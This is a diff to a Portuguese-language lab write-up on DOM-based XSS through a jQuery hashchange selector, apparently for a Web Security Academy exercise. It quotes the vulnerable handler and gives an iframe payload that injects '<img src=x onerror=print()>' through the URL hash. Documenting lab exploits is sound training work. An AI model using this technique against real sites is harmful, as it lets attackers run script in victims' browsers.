@@ -127,6 +127,19 @@ Para resolver o laboratório, entregue um exploit para a vítima que chama a pri
 
 <img src=https://github.com/iRnx/Lab-Cross-Site-Scripting-XSS-/blob/main/imagens/Lab-6/Lab-6-part3.PNG>
 
+<strong>Passo 4:</strong> Agora vamos supor que nós queremos mandar este link malicioso para alguma vítima, infelizmente não irá funcionar!! sabe porque? pois não houve uma mudança de hash e consequentemente não executou a função anônima. 
+
+                         <pre>$(window).on('hashchange', function(){ 
+                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+                            if (post) post.get(0).scrollIntoView();
+                        });</pre>
+  
+
+nesta parte: "$(window).on('hashchange', function(){" esta falando que quando houver uma mudança de "hashchange" a função irá executar. porém se enviarmos para a vítima não vai haver uma mudança de hash, e pra isso vamos ter que escrever um exploit que vai fazer exatamente essa mudança de hash que nós queremos quando a vítima acessar o link malicioso.
+
+`<iframe src="https://0a4400f603e92417c05480600063003a.web-security-academy.net/#1533" onload="this.src+='<img src=x onerror=print()>'"/>`
+
+calma que vou explicar cada pedacinho desse exploit.
 
 
 
